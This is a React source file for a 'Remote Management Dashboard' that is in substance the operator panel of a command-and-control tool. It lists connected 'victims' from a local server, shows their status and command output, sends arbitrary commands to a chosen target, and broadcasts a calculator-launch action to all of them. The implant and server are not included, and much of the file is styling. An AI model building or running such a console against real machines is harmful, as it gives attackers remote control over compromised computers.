import React, { useEffect, useState } from "react";

export default function Dashboard() {
  const [victims, setVictims] = useState({});
  const [outputLog, setOutputLog] = useState([]);
  const [selectedVictim, setSelectedVictim] = useState("");
  const [command, setCommand] = useState("");
  const [showOutput, setShowOutput] = useState(true); // toggle state
  const [victimOutputs, setVictimOutputs] = useState({});

  const API_BASE = "http://localhost:8000";


  useEffect(() => {
    const fetchData = () => {
      fetch(`${API_BASE}/api/dashboard`)
        .then((res) => res.json())
        .then((data) => {
          setVictims(data.victims || {});
          
          // Group outputs by victim ID
          const outputsByVictim = {};
          (data.output_log || []).forEach(({ victim_id, output }) => {
            if (!outputsByVictim[victim_id]) outputsByVictim[victim_id] = "";
            outputsByVictim[victim_id] += output + "\n";
          });
          setVictimOutputs(outputsByVictim);

          // Also keep flat outputLog for activity log view (optional)
          setOutputLog(data.output_log || []);
        })
        .catch((err) => console.error("Fetch error:", err));
    };
    fetchData();
    const interval = setInterval(fetchData, 5000);
    return () => clearInterval(interval);
  }, []);


  const handleSendCommand = (e) => {
    if (e) e.preventDefault();
    if (!selectedVictim || !command) return;
    fetch(`${API_BASE}/send_command`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ victim_id: selectedVictim, command }),
    }).then(() => setCommand(""));
  };

  const clearVictimData = () => {
    fetch(`${API_BASE}/api/clear`, { method: "POST" }).then(() => {
      setVictims({});
      setOutputLog([]);
      setSelectedVictim("");
    });
  };

  const handleBroadcastCalc = () => {
    fetch(`${API_BASE}/send-calc`, { method: "POST" });
  };

  const now = Date.now() / 1000;

  return (
    <div style={styles.container}>
      {/* Header */}
      <div style={styles.header}>
        <div style={styles.headerContent}>
          <h1 style={styles.title}>Remote Management Dashboard</h1>
          <div style={styles.headerInfo}>
            <span style={styles.infoText}>
              {Object.keys(victims).length} connected • Last updated: {new Date().toLocaleTimeString()}
            </span>
          </div>
        </div>
      </div>

      {/* Main content */}
      <div style={styles.main}>
        {/* Sidebar */}
        <div style={styles.sidebar}>
          {/* Actions */}
          <div style={styles.card}>
            <h3 style={styles.cardTitle}>Quick Actions</h3>
            <div style={styles.buttonGroup}>
              <button onClick={handleBroadcastCalc} style={styles.primaryButton}>
                Start Calculator (All)
              </button>
              <button onClick={clearVictimData} style={styles.secondaryButton}>
                Clear All Data
              </button>
            </div>
          </div>

          {/* Command Panel */}
          {Object.keys(victims).length > 0 && (
            <div style={styles.card}>
              <h3 style={styles.cardTitle}>Send Command</h3>
              <div style={styles.formGroup}>
                <label style={styles.label}>Target</label>
                <select
                  value={selectedVictim}
                  onChange={(e) => setSelectedVictim(e.target.value)}
                  style={styles.select}
                >
                  <option value="">Select target...</option>
                  {Object.entries(victims).map(([identity, data]) => (
                    <option key={data.id} value={data.id}>
                      {data.id} ({identity})
                    </option>
                  ))}
                </select>
              </div>

              <div style={styles.formGroup}>
                <label style={styles.label}>Command</label>
                <input
                  type="text"
                  value={command}
                  onChange={(e) => setCommand(e.target.value)}
                  style={styles.input}
                  placeholder="Enter command..."
                  onKeyPress={(e) => e.key === "Enter" && handleSendCommand()}
                />
              </div>

              <button
                onClick={handleSendCommand}
                disabled={!selectedVictim || !command}
                style={{
                  ...styles.primaryButton,
                  ...((!selectedVictim || !command) ? styles.disabledButton : {}),
                }}
              >
                Execute
              </button>
            </div>
          )}
        </div>

        {/* Combined Output & Activity Log */}
        <div style={styles.content}>
          <div style={styles.card}>
            <div style={{ ...styles.cardHeader, justifyContent: 'flex-start', gap: '12px' }}>
              <button
                onClick={() => setShowOutput(true)}
                style={{
                  ...styles.toggleButton,
                  ...(showOutput ? styles.toggleButtonActive : {}),
                }}
              >
                Current Output
              </button>
              <button
                onClick={() => setShowOutput(false)}
                style={{
                  ...styles.toggleButton,
                  ...(!showOutput ? styles.toggleButtonActive : {}),
                }}
              >
                Activity Log
                <span style={styles.badge}>{outputLog.length}</span>
              </button>
            </div>

            {showOutput ? (
              <div style={styles.outputContainer}>
                <pre style={styles.outputText}>
                  {selectedVictim && victimOutputs[selectedVictim]
                    ? victimOutputs[selectedVictim]
                    : "No output for selected victim."}
                </pre>
              </div>
            ) : (
              <div style={styles.logContainer}>
                {outputLog.length > 0 ? (
                  outputLog.slice(-10).reverse().map((log, idx) => (
                    <div key={idx} style={styles.logEntry}>
                      <div style={styles.logHeader}>
                        <code style={styles.logId}>{log.victim_id}</code>
                        <span style={styles.logTime}>{log.timestamp}</span>
                      </div>
                      <pre style={styles.logOutput}>{log.output}</pre>
                    </div>
                  ))
                ) : (
                  <div style={styles.emptyState}>
                    <p style={styles.emptyText}>No activity logged</p>
                  </div>
                )}
              </div>
            )}
          </div>
        </div>

        {/* Connected Targets on the right */}
        <div style={styles.targetsRight}>
          <div style={styles.card}>
            <div style={styles.cardHeader}>
              <h3 style={styles.cardTitle}>Connected Targets</h3>
              <span style={styles.badge}>{Object.keys(victims).length} active</span>
            </div>

            {Object.keys(victims).length > 0 ? (
              <div style={styles.tableContainer}>
                <table style={styles.table}>
                  <thead>
                    <tr>
                      <th style={styles.th}>ID</th>
                      <th style={styles.th}>Identity</th>
                      <th style={styles.th}>Last Seen</th>
                      <th style={styles.th}>Status</th>
                    </tr>
                  </thead>
                  <tbody>
                    {Object.entries(victims).map(([identity, data]) => {
                      const lastSeenAgo = now - data.last_seen;
                      const isOnline = lastSeenAgo < 15;
                      return (
                        <tr key={data.id} style={styles.tr}>
                          <td style={styles.td}>
                            <code style={styles.code}>{data.id}</code>
                          </td>
                          <td style={styles.td}>{identity}</td>
                          <td style={styles.td}>{lastSeenAgo.toFixed(1)}s ago</td>
                          <td style={styles.td}>
                            <span
                              style={{
                                ...styles.statusBadge,
                                ...(isOnline ? styles.onlineStatus : styles.offlineStatus),
                              }}
                            >
                              {isOnline ? "Online" : "Offline"}
                            </span>
                          </td>
                        </tr>
                      );
                    })}
                  </tbody>
                </table>
              </div>
            ) : (
              <div style={styles.emptyState}>
                <p style={styles.emptyText}>No targets connected</p>
              </div>
            )}
          </div>
        </div>
      </div>
    </div>
  );
}

// Catppuccin Mocha colors
const colors = {
  base: "#1e1e2e",
  mantle: "#181825",
  surface0: "#313244",
  surface1: "#45475a",
  surface2: "#585b70",
  overlay0: "#6c7086",
  overlay1: "#7f849c",
  overlay2: "#9399b2",
  subtext0: "#a6adc8",
  subtext1: "#bac2de",
  text: "#cdd6f4",
  lavender: "#b4befe",
  blue: "#89b4fa",
  sapphire: "#74c7ec",
  sky: "#89dceb",
  teal: "#94e2d5",
  green: "#a6e3a1",
  yellow: "#f9e2af",
  peach: "#fab387",
  maroon: "#eba0ac",
  red: "#f38ba8",
  mauve: "#cba6f7",
  pink: "#f5c2e7",
  flamingo: "#f2cdcd",
  rosewater: "#f5e0dc",
};

const styles = {
  container: {
    fontFamily: "'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif",
    backgroundColor: colors.base,
    color: colors.text,
    minHeight: "100vh",
    fontSize: "14px",
  },
  header: {
    backgroundColor: colors.mantle,
    borderBottom: `1px solid ${colors.surface0}`,
    padding: "16px 24px",
  },
  headerContent: {
    maxWidth: "1400px",
    margin: "0 auto",
  },
  title: {
    fontSize: "20px",
    fontWeight: "600",
    color: colors.text,
    margin: "0 0 4px 0",
  },
  headerInfo: {
    fontSize: "13px",
    color: colors.subtext1,
  },
  infoText: {
    color: colors.subtext1,
  },
  main: {
    maxWidth: "1400px",
    margin: "0 auto",
    padding: "24px",
    display: "grid",
    gridTemplateColumns: "320px 1fr 400px",
    gap: "24px",
    alignItems: "start",
  },
  sidebar: {
    display: "flex",
    flexDirection: "column",
    gap: "16px",
  },
  content: {
    display: "flex",
    flexDirection: "column",
    gap: "16px",
  },
  targetsRight: {
    display: "flex",
    flexDirection: "column",
    gap: "16px",
  },
  card: {
    backgroundColor: colors.surface0,
    borderRadius: "8px",
    border: `1px solid ${colors.surface1}`,
    overflow: "hidden",
  },
  cardHeader: {
    display: "flex",
    justifyContent: "space-between",
    alignItems: "center",
    padding: "16px 20px",
    borderBottom: `1px solid ${colors.surface1}`,
  },
  cardTitle: {
    fontSize: "15px",
    fontWeight: "600",
    color: colors.text,
    margin: "0",
    padding: "16px 20px 12px 20px",
  },
  buttonGroup: {
    display: "flex",
    flexDirection: "column",
    gap: "8px",
    padding: "0 20px 20px 20px",
  },
  primaryButton: {
    backgroundColor: colors.blue,
    color: colors.base,
    border: "none",
    borderRadius: "6px",
    padding: "10px 16px",
    fontSize: "13px",
    fontWeight: "500",
    cursor: "pointer",
    transition: "all 0.2s ease",
  },
  secondaryButton: {
    backgroundColor: colors.surface1,
    color: colors.text,
    border: `1px solid ${colors.surface2}`,
    borderRadius: "6px",
    padding: "10px 16px",
    fontSize: "13px",
    fontWeight: "500",
    cursor: "pointer",
    transition: "all 0.2s ease",
  },
  disabledButton: {
    backgroundColor: colors.surface1,
    color: colors.overlay0,
    cursor: "not-allowed",
    opacity: 0.6,
  },
  formGroup: {
    padding: "0 20px 16px 20px",
  },
  label: {
    display: "block",
    fontSize: "13px",
    fontWeight: "500",
    color: colors.subtext1,
    marginBottom: "6px",
  },
  input: {
    width: "100%",
    padding: "10px 12px",
    backgroundColor: colors.surface1,
    border: `1px solid ${colors.surface2}`,
    borderRadius: "6px",
    color: colors.text,
    fontSize: "13px",
    fontFamily: "inherit",
    boxSizing: "border-box",
  },
  select: {
    width: "100%",
    padding: "10px 12px",
    backgroundColor: colors.surface1,
    border: `1px solid ${colors.surface2}`,
    borderRadius: "6px",
    color: colors.text,
    fontSize: "13px",
    fontFamily: "inherit",
    boxSizing: "border-box",
  },
  outputContainer: {
    padding: "20px",
  },
  outputText: {
    backgroundColor: colors.mantle,
    border: `1px solid ${colors.surface1}`,
    borderRadius: "6px",
    padding: "12px",
    color: colors.green,
    fontSize: "12px",
    fontFamily: "'JetBrains Mono', 'Fira Code', monospace",
    margin: "0",
    whiteSpace: "pre-wrap",
  },
  badge: {
    backgroundColor: colors.surface1,
    color: colors.subtext1,
    padding: "4px 8px",
    borderRadius: "4px",
    fontSize: "12px",
    fontWeight: "500",
    marginLeft: 6,
  },
  tableContainer: {
    overflowX: "auto",
  },
  table: {
    width: "100%",
    borderCollapse: "collapse",
  },
  th: {
    textAlign: "left",
    padding: "12px 20px",
    backgroundColor: colors.surface1,
    color: colors.subtext1,
    fontSize: "12px",
    fontWeight: "600",
    textTransform: "uppercase",
    letterSpacing: "0.5px",
    borderBottom: `1px solid ${colors.surface2}`,
  },
  tr: {
    borderBottom: `1px solid ${colors.surface1}`,
  },
  td: {
    padding: "14px 20px",
    color: colors.text,
    fontSize: "13px",
  },
  code: {
    backgroundColor: colors.surface1,
    color: colors.mauve,
    padding: "2px 6px",
    borderRadius: "3px",
    fontSize: "12px",
    fontFamily: "'JetBrains Mono', monospace",
  },
  statusBadge: {
    padding: "3px 8px",
    borderRadius: "12px",
    fontSize: "11px",
    fontWeight: "500",
  },
  onlineStatus: {
    backgroundColor: colors.green + "30",
    color: colors.green,
  },
  offlineStatus: {
    backgroundColor: colors.red + "30",
    color: colors.red,
  },
  logContainer: {
    maxHeight: "320px",
    overflowY: "auto",
    padding: "16px 20px",
    backgroundColor: colors.mantle,
    borderRadius: "6px",
  },
  logEntry: {
    marginBottom: "16px",
  },
  logHeader: {
    display: "flex",
    justifyContent: "space-between",
    marginBottom: "6px",
  },
  logId: {
    fontWeight: "700",
    color: colors.lavender,
    fontFamily: "'JetBrains Mono', monospace",
  },
  logTime: {
    fontSize: "11px",
    color: colors.subtext1,
    fontStyle: "italic",
  },
  logOutput: {
    backgroundColor: colors.surface1,
    borderRadius: "6px",
    padding: "10px",
    fontFamily: "'JetBrains Mono', monospace",
    fontSize: "12px",
    color: colors.text,
    whiteSpace: "pre-wrap",
  },
  emptyState: {
    padding: "40px 20px",
    textAlign: "center",
    color: colors.overlay1,
    fontSize: "14px",
  },
  emptyText: {
    margin: 0,
  },
  toggleButton: {
    backgroundColor: colors.surface1,
    border: "none",
    borderRadius: "6px",
    padding: "8px 16px",
    fontSize: "13px",
    color: colors.subtext1,
    cursor: "pointer",
    transition: "background-color 0.2s ease",
  },
  toggleButtonActive: {
    backgroundColor: colors.blue,
    color: colors.base,
  },
};
